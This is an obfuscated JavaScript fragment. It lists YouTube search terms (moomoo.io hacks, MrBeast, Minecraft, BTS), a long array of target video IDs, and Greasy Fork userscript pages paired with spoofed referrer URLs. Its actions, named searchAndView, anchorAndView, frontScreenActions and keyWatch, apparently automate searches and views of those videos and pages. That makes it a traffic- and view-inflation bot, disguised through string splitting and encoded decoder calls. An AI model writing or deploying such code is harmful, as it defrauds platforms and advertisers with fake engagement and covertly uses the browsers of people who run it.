searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + a2(0x15, 'a]2(') + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x2 * -0xc87 + 0xb * 0x1fd + 0x21 * 0x19)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x7 * -0x428 + -0x27 * -0xfc + 0x9e * -0xf)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x2159 * 0x1 + -0x21cb + 0x75);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    a2(0x6, 'xCxl') + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    a1(0x19) + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + a1(0x1d) + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': a1(0x8) + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + a0(0x18) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + a0(0x7) + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + a2(0x0, 'q(Gn') + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + a1(0x1d) + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': a0(0x1e) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + a2(0x21, '95t*') + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
